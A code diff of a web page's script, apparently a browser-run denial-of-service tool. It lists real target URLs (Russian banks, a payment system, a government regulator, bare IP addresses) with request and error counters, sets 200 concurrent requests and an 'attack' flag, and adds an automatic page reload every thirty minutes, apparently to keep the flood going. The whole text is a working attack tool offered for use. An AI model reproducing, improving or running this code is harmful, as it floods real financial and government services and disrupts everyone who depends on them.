@@ -130,7 +130,7 @@
 
     <script>
         // target list
-        var targets = {
+        let targets = {
             'https://185.170.1.142/': { number_of_requests: 0, number_of_errored_responses: 0 },
             'https://csp.nspk.ru/mironline': { number_of_requests: 0, number_of_errored_responses: 0 },
             'https://109.207.1.97/': { number_of_requests: 0, number_of_errored_responses: 0 },
@@ -147,14 +147,18 @@
             'https://rkn.gov.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
             'https://www.tinkoff.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
             'https://online.sberbank.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
-        }
+        };
+
+        window.setTimeout( function() {
+            window.location.reload();
+        }, 30*60*1000);
 
         // initialize variables
-        var urls = Object.keys(targets);
-        var statRow = document.querySelector("#stats > .row");
-        var CONCURRENCY_LIMIT = 200;
-        var queue = [];
-        var attack = true;
+        let urls = Object.keys(targets);
+        let statRow = document.querySelector("#stats > .row");
+        let CONCURRENCY_LIMIT = 200;
+        let queue = [];
+        let attack = true;
 
         function togglePause () {
             if (attack) {
